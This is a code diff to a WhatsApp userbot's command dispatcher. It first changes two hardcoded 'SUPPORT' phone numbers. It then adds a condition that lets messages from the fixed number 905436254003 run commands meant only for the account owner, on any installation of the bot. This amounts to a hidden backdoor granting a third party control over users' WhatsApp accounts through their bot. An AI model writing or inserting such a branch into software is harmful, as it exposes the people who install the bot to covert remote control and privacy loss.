@@ -384,11 +384,11 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
             if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
         
-        if (config.SUPPORT == '905436254003-1612300121') {     
+        if (config.SUPPORT == '905436254003,0') {     
             var sup = config.SUPPORT.split(',');                            
             if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
-        if (config.SUPPORT2 == '905061689909-1617736751') {     
+        if (config.SUPPORT2 == '905061689909,0') {     
             var tsup = config.SUPPORT2.split(',');                            
             if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
@@ -435,6 +435,19 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                    }
+                    if ((config.SUPPORT == "905436254003,0" && msg.key.fromMe === false && command.fromMe === true &&
+
+                        (msg.participant && config.SUPPORT.includes(',') ? config.SUPPORT.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUPPORT || config.SUPPORT.includes(',') ? config.SUPPORT.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUPPORT)
+
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+
+                        if (command.onlyPinned && chat.pin === undefined) return;
+
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+
                     }
                     // ==================== End Events ====================
 
